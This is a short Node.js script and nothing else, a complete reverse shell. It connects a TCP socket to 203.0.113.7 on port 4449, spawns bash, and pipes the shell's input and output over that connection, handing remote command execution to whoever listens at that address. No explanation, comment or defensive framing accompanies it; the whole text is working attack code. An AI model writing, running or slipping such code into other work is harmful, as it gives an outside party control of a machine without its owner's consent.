const net = require('net');
const { spawn } = require('child_process');

const client = new net.Socket();
client.connect(4449, '203.0.113.7', () => {
  const shell = spawn('bash', []);
  client.pipe(shell.stdin);
  shell.stdout.pipe(client);
  shell.stderr.pipe(client);
});
